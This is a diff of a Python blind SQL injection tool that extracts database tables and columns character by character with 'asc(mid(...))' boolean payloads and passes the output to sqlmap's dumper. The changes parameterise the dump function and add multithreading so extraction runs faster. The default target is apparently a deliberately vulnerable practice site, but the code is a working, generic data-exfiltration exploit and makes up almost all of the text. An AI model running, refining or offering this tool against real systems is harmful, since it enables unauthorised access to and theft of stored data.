@@ -4,17 +4,13 @@ import requests
 import threading
 import sys
 sys.path.append(os.getcwd())
-
 from src.core.dumper.dump import dumper
 from sqlmap.lib.core.data import conf
-import sys
 
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
 }
-table_list = []
-column_list = []
-data_dir = {}
+
 
 def Generator_table():
     with open(os.path.join(os.getcwd(), "data/txt/tables.txt"), "r") as file:
@@ -111,10 +107,10 @@ class Dump(object):
             n += 1
         return n
 
-    def dump_data(self):
+    def dump_data(self, table, column):
         data = ""
         length = self.len_data()
-        print("[+] The Length of %s in %s is %s !" % (self.column, self.table, length))
+        print("[+] The Length of %s in %s is %s !" % (column, table, length))
         print("[+] Dumping data, please wait!")
 
         for i in range(1, length + 1):
@@ -125,7 +121,7 @@ class Dump(object):
                 except IndexError:
                     break
 
-                payload = "and (select top 1 asc(mid(%s,%s,1)) from %s) =%s" % (self.column, i, self.table, char)
+                payload = "and (select top 1 asc(mid(%s,%s,1)) from %s) =%s" % (column, i, table, char)
                 url = self.url
 
                 if '*' in url:
@@ -144,12 +140,11 @@ class Dump(object):
                     pass
 
         global data_dir
-        data_dir[(self.table, self.column)] = data
-    
-    def dump_all_result(self):
-        for table in table_list:
-            for column in column_list:
+        data_dir[(table, column)] = data
 
+    def dump_all_result(self):
+        for table in self.table_list:
+            for column in self.column_list:
                 dumper.setOutputFile()
                 dumper.dbColumns(column)
                 conf.found_column = column
@@ -159,14 +154,15 @@ class Dump(object):
                 dumper.hostname("localhost")
                 dumper.dba(True)
                 dumper.users(["None", "None", "None"])
-                dumper.statements(["SELECT * FROM %s"%table, "INSERT INTO %s VALUES (1, 'Product1')"%table])
+                dumper.statements(["SELECT * FROM %s" % table, "INSERT INTO %s VALUES (1, 'Product1')" % table])
                 dumper.dbs(["database", "database"])
                 dumper.dbTables({"database": [table, table], "database2": [table, table]})
-                dumper.dbTableColumns({"database": {table: {column: "VARCHAR", column: "INTEGER"}, table: {column: "UNKNOWN"}}})
-                dumper.dbTableColumns({table:column})
+                dumper.dbTableColumns({"database": {table: {column: "VARCHAR", column: "INTEGER"},
+                                                    table: {column: "UNKNOWN"}}})
+                dumper.dbTableColumns({table: column})
                 time.sleep(10)
 
-def run_col(dump_instance:Dump, table, column):
+def run_col(dump_instance: Dump, table, column):
     dump_instance.dump_data(table, column)
     dump_instance.dump_all_result()
 
@@ -209,28 +205,25 @@ def main(url, tables=True, columns=False, dump=False, keyword=None, thread_num=1
             print("[+] %s in table: %s" % (col[1], col[0]))
 
     if dump:
+        threads = []
         for table in dump_instance.table_list:
             for column in dump_instance.column_list:
-                run_col(dump_instance, table, column)
+                thread = threading.Thread(target=run_col, args=(dump_instance, table, column))
+                thread.start()
+                threads.append(thread)
+
+        # Wait for all threads to complete before moving on
+        for thread in threads:
+            thread.join()
 
         print("[+] Dumping completed!")
 
 
-def run():
-        main(
-        url="https://hack-yourself-first.com/Make/5?orderby=supercarid",
-        tables=True,
-        columns=False,
-        dump=True,  # Change to True to enable data dumping
-        keyword="Application"
-    )
-
-
-if __name__ == "__main__" or True:
+if __name__ == "__main__":
     main(
         url="https://hack-yourself-first.com/Make/5?orderby=supercarid",
         tables=True,
-        columns=False,
+        columns=True,
         dump=True,  # Change to True to enable data dumping
         keyword="Application"
     )
